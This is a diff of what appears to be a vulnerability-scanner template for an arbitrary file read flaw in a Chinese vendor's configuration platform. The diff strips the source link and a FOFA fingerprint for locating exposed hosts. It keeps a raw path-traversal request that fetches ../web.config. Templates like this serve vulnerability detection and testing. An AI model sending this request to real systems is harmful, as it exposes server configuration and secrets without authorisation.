@@ -3,12 +3,8 @@ info:
   name: 安徽生命港湾信息技术有限公司服务配置工具平台 Download 任意文件读取漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/khoplb3wc5qfqtmz'
+  description: ''
   tags: lfi,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: khoplb3wc5qfqtmz
-    fofa: body="css/markdown.css" && body="icon-512.png"
 http:
 - raw:
   - 'GET /api/File/Download?file=../web.config HTTP/1.1
